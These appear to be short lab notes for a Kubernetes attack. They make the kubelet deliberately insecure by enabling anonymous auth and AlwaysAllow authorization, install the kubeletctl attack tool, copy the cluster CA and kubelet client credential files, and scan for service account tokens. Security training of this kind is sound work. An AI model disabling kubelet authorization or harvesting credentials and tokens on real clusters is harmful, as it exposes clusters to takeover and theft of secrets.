# Setup
```bash
sudo sed -i -e 's/enabled: false/enabled: true/' -e 's/mode: Webhook/mode: AlwaysAllow/' /var/lib/kubelet/config.yaml

sudo systemctl restart kubelet

curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.12/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```
# Attack

uses undocumented k8s apis
kubeletctl shorthand tool https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster

requries privileges!

# You MUST do this:

- cat /etc/kubernetes/pki/ca.crt save to ~/Desktop
- sudo cat /var/lib/kubelet/pki/kubelet-client-current.pem save to ~/Desktop

```bash
kubeletctl scan token

```